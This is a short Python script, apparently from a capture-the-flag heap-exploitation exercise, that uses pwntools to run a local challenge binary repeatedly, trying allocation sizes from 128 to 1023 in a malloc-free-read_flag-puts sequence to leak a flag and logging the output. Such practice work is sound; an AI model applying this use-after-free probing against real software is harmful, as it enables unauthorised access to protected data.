import pwn

f = open("out", "w") 
for i in range(128,1024): 
    x = "malloc\n" + str(i) + "\nfree\nread_flag\nputs\nquit\n" 
    io = pwn.process("/challenges/heap/level2_testing1") 
    io.send(x.encode()) 
    f.write(io.readall().decode('latin-1')) 
    io.close() 
f.close()